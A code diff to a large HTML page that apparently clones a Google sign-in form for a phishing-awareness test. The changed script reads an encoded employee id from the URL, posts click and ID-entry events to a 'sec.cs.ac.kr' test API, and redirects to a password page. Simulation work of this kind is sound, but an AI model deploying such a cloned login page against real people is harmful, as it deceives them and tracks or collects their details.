@@ -33555,15 +33555,20 @@
                                 return new TextDecoder().decode(bytes);
                             }
                             async function init(){
-                                const path = window.location.pathname;
-                                const parts = path.split('/').filter(Boolean); 
-                                const lastPart = parts[parts.length - 1];
+
+
+                                const params = new URLSearchParams(window.location.search);
+                                const uid = params.get("uid");     // "30072"
+
+                                // const path = window.location.pathname;
+                                // const parts = path.split('/').filter(Boolean); 
+                                // const lastPart = parts[parts.length - 1];
 
                                 const input = document.querySelector('input[jsname="YPqjbf"]');
                                 const SERVER_URL = "https://sec.cs.ac.kr"
                                 let JsonArray = new Array();
                                 let JsonObject = new Object;
-                                JsonObject.SABUN = base64DecodeToString(lastPart);
+                                JsonObject.SABUN = base64DecodeToString(uid);
                                 JsonArray.push(JsonObject);
 
                                 const res = await fetch(SERVER_URL+'/api/test/click',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
@@ -33572,15 +33577,15 @@
                             async function inputId(){
 
 
-                                const path = window.location.pathname;
-                                const parts = path.split('/').filter(Boolean); 
-                                const lastPart = parts[parts.length - 1];
+                                const params = new URLSearchParams(window.location.search);
+                                const uid = params.get("uid");     // "30072"
+
 
                                 const input = document.querySelector('input[jsname="YPqjbf"]');
                                 const SERVER_URL = "https://sec.cs.ac.kr"
                                 let JsonArray = new Array();
                                 let JsonObject = new Object;
-                                JsonObject.SABUN = base64DecodeToString(lastPart);
+                                JsonObject.SABUN = base64DecodeToString(uid);
                                 JsonArray.push(JsonObject);
 
                                 const res = await fetch(SERVER_URL+'/api/test/input/id',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
@@ -33590,7 +33595,7 @@
                                 if(data.MSG == "SUCCESS"){
                                     
                                     const currentPath = window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, "/");
-                                    window.location.href = currentPath + "passwd.html?uid="+lastPart;
+                                    window.location.href = currentPath + "passwd.html?uid="+uid;
 
                                 }
 
